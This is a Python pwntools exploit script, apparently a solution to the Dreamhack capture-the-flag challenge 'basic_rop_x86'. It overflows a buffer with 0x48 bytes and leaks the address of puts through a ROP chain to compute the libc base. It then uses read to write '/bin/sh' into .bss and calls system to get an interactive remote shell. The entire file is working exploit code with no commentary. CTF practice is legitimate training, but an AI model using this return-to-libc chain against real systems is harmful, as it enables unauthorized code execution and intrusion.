from pwn import *

context.log_level = 'debug'

p = remote("host3.dreamhack.games",16581)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

read_plt=e.plt['read']
read_got=e.got['read']
puts_plt=e.plt['puts']
puts_got=e.got['puts']

pop_ret=0x0804868b
ppp_ret=0x08048689
main = e.symbols['main']
binsh = '/bin/sh\x00'
bss = e.bss() + 0x200

payload=b'A'*0x48
payload += p32(puts_plt)
payload += p32(pop_ret) 
payload += p32(puts_got)
payload += p32(main)

p.sendline(payload)

leak = u32(p.recvuntil('\xf7')[-4:])
log.info('libc  = ' +hex(leak))

libc_base = leak - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))

system = libc_base + libc.symbols['system']
log.info('system : ' + hex(system))

payload2 = b'A'*0x48
payload2 += p32(read_plt) 
payload2 += p32(ppp_ret)
payload2 += p32(0) 
payload2 += p32(e.bss()+ 0x200)
payload2 += p32(8) 

payload2 += p32(system)
payload2 += p32(0)
payload2 += p32(e.bss()+0x200)

p.send(payload2)
p.send(binsh)

p.interactive()
